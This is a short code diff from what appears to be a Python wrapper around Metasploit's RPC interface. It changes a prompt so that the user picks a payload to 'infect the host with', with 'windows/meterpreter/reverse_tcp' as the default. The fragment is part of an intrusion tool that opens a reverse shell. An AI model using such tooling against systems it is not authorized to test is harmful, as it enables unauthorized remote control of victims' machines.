@@ -106,8 +106,8 @@ def run():
     except MsfRpcError as e:
         term.fail(e)
 
-    term.poll('What payload module would you like to infect the host with?')
-    name = 'windows/meterpreter/reverse_tcp' #input()
+    name = term.poll('What payload module would you like to infect the ' \
+        'host with?', default='windows/meterpreter/reverse_tcp')
     try:
         module = PayloadModule(client, name)
     except MsfRpcError as e:
